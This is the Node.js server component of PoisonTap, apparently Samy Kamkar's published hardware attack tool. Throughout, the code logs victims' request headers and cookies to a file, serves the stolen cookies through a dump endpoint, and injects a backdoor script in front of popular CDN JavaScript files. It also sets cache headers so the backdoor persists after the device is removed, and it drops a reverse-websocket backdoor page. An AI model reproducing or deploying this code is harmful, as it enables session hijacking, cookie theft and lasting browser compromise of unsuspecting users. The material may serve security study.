/*
 * PoisonTap
 *  by samy kamkar
 *  http://samy.pl/poisontap
 *  01/08/2016
 * 
 */

var http = require("http");
var fs = require('fs');
var util = require('util');
var backdoorPreJs = fs.readFileSync(__dirname + '/target_backdoor.js'); // this gets prepended before legit js, eg jquery.js
var backdoorHtml = fs.readFileSync(__dirname + '/backdoor.html');
var log_file = fs.createWriteStream(__dirname + '/poisontap.cookies.log', {flags : 'a'});
var log_stdout = process.stdout;
var replacejs = fs.readdirSync(__dirname + '/js');
var blinked = false;
var repobj = {};
for (var i in replacejs)
	repobj[replacejs[i].replace(/__/g, '/')] = fs.readFileSync(__dirname + '/js/' + replacejs[i]);

console.log = function(d) {
  log_file.write(util.format(d) + '\n');
  log_stdout.write(util.format(d) + '\n');
};

var startBlinking = function() {
	// Configuration
	var BLINK_MAX = 20;
	var BLINK_SPEED = 100;

	// Blinking function
	var util = require('util'), exec = require('child_process').exec, child;
	var oldState = 1;
	var count = 0;

	var changeLedState = function(state) {
		oldState = state;
		child = exec('nice -n -20 echo '+state+' | sudo tee /sys/class/leds/led0/brightness');
	}

	var blink = function() {
		changeLedState(oldState == 1 ? 0 : 1);
		count++;
		
		if (count <= BLINK_MAX + 1) {
			setTimeout(blink, BLINK_SPEED);
		} else {
			changeLedState(1);
			setTimeout(function(){changeLedState(0)},3000);
		}
	}

	blink();
};

var xhtml = fs.readFileSync(__dirname + '/target_injected_xhtmljs.html');
if (!xhtml)
{
	console.log("Couldn't read PoisonTap evil html");
	process.exit();
}

var server = http.createServer(function(request, response) {
	var url = request.headers.host + request.url;
	console.log('Request: ' + url);
	console.log(request.headers);

	var headers = {
		"Content-Type": "text/html",
		"Server": "PoisonTap/1.0 SamyKamkar/0.1",
		"Cache-Control": "public, max-age=99936000",
		"Expires": "Sat, 26 Jul 2040 05:00:00 GMT",
		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT",
		"Access-Control-Allow-Origin": "*"
	};

	// cache for a very long time to poison future requests after we're gone
	if (repobj[url])
	{
		console.log('>>> Known CDN');
		response.writeHead(200, headers);
		response.write(backdoorPreJs);
		response.write(repobj[url]);
		response.end();
		return;
	}

	// if this is a poisontap request, we just siphoned cookies, now drop html backdoor
	else if (url.indexOf('/PoisonTap') != -1)
	{
		// Blink ACT led on RPi to know if the injection is going well
		if (!blinked) {
			blinked = true;
			startBlinking();
		}
		
		console.log('>>> Inject Backdoor HTML reverse ws 1337');
		response.writeHead(200, headers);
		response.write(backdoorHtml);
		response.end();
		return;
	}
	
	// if this is a cookie dump request, return cookie file.  CORS header required to make it work
	else if (url.indexOf('/PoisonCookieDump') != -1)
	{
		console.log('>>> Cookie Dump');
		response.writeHead(200, headers);
		response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));
		response.end();
		return;
	}
	
  // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
	else
	{
		console.log('>>> Inject Target xhtmljs');
		response.writeHead(200, headers);

		// NOT poisontap hit, inject cross-js/html file
		response.write(xhtml);
		response.end();
		return;
	}
});

server.listen(1337);
console.log("==== "+new Date().toJSON()+" ["+Date.now()+"] ====");
console.log("PoisonTap is listening");
